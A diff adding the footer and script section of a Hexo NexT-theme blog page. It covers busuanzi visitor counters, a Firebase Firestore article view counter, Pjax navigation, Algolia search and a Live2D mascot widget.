+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-firestore.js"></script>
+  <script>
+    firebase.initializeApp({
+      apiKey   : '',
+      projectId: ''
+    });
+
+    function getCount(doc, increaseCount) {
+      // IncreaseCount will be false when not in article page
+      return doc.get().then(d => {
+        var count = 0;
+        if (!d.exists) { // Has no data, initialize count
+          if (increaseCount) {
+            doc.set({
+              count: 1
+            });
+            count = 1;
+          }
+        } else { // Has data
+          count = d.data().count;
+          if (increaseCount) {
+            // If first view this article
+            doc.set({ // Increase count
+              count: count + 1
+            });
+            count++;
+          }
+        }
+
+        return count;
+      });
+    }
+
+    function appendCountTo(el) {
+      return count => {
+        el.innerText = count;
+      }
+    }
+  </script>
+  <script data-pjax>
+    (function() {
+      var db = firebase.firestore();
+      var articles = db.collection('articles');
+
+      if (CONFIG.page.isPost) { // Is article page
+        var title = document.querySelector('.post-title').innerText.trim();
+        var doc = articles.doc(title);
+        var increaseCount = CONFIG.hostname === location.hostname;
+        if (localStorage.getItem(title)) {
+          increaseCount = false;
+        } else {
+          // Mark as visited
+          localStorage.setItem(title, true);
+        }
+        getCount(doc, increaseCount).then(appendCountTo(document.querySelector('.firestore-visitors-count')));
+      } else if (CONFIG.page.isHome) { // Is index page
+        var promises = [...document.querySelectorAll('.post-title')].map(element => {
+          var title = element.innerText.trim();
+          var doc = articles.doc(title);
+          return getCount(doc);
+        });
+        Promise.all(promises).then(counts => {
+          var metas = document.querySelectorAll('.firestore-visitors-count');
+          counts.forEach((val, idx) => {
+            appendCountTo(metas[idx])(val);
+          });
+        });
+      }
+    })();
+  </script>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"}});</script></body>
+</html>
